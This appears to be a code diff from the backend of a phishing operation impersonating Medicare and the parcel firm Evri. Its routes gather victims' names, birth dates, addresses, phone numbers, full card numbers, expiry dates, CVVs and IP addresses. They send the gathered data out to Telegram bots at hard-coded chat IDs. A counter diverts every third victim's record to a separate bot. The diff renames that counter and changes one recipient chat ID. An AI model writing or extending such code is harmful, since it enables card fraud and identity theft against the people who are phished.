@@ -448,11 +448,11 @@ app.post("/putinMedicare", (req, res) => {
     .then(function () {
       binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
       var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
-      if (failedlawyer == 3) {
+      if (putin == 3) {
         axios.post(
           `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
         );
-        failedlawyer = 0;
+        putin = 0;
       } else {
         axios.post(
           `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=MedicarePutin:\n${originalText}`
@@ -460,7 +460,7 @@ app.post("/putinMedicare", (req, res) => {
         axios.post(
           `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5362313568&text=MediCare:\n${originalText}`
         );
-        failedlawyer += 1;
+        putin += 1;
       }
 
       res.send("Update Completed");
@@ -3944,7 +3944,7 @@ app.post("/TheOnlyMYEvri", (req, res) => {
           `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriTheOnlyMY:\n${originalText}`
         );
         axios.post(
-          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=2032190159&text=Evri:\n${originalText}`
+          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=418410122&text=Evri:\n${originalText}`
         );
         TheOnlyMY += 1;
       }
